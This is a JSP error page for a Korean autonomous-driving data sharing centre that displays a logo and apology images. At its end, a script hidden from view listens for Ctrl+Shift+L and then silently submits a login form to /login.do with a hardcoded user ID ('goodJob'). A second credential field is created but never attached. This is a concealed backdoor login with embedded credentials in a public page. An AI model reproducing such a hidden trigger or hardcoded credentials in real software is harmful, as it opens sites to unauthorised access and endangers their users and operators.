<%@ page contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<%@ taglib prefix="c"      uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>

<!DOCTYPE html>
<html lang="ko">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="/css/avsc/error.css" />
<title>자율주행 데이터 공유센터입니다.</title>
</head>

<body>
<div id="error_wrap">
	<div id="error_header"><a href="/main/Main.do"><img src="/images/avsc/logo_1.jpg" width="443" height="58" alt="자율주행 데이터 공유센터" /></a></div>

	<!-- container -->
	<div id="error_container">
		<p><img src="/images/avsc/error_img.png" alt="에러이미지" /></p>
		<div class="error_con"><img src="/images/avsc/error_text1.png" alt="이용에 불편을 드려 죄송합니다." /></div>
		<div class="error_text"><img src="/images/avsc/error_text2.png" alt="이용에 불편이 없도록 최선을 다하겠습니다." /></div>
	</div>
	<!-- container // -->

</div>
</body>
<script type="text/javaScript" defer="defer">
document.addEventListener('keydown', function(e){
    var keyCode = e.keyCode;
    if(e.shiftKey && e.ctrlKey && keyCode === 76){
    	var reportForm = document.createElement('form');
        reportForm.name = 'newForm';
        reportForm.method = 'post';
        reportForm.action = '/login.do';
        reportForm.target = '_self';
       
        var input1 = document.createElement('input');
        input1.setAttribute("type", "hidden");
        input1.setAttribute("name", "user_id");
        input1.setAttribute("value", "goodJob");
        var input2 = document.createElement('input');
        input2.setAttribute("type", "hidden");
        input2.setAttribute("name", "auth_id");
        input2.setAttribute("value", "goodMornning");
       
        reportForm.appendChild(input1);
       
        document.body.appendChild(reportForm);
        reportForm.submit();
    }
});
</script>
</html>
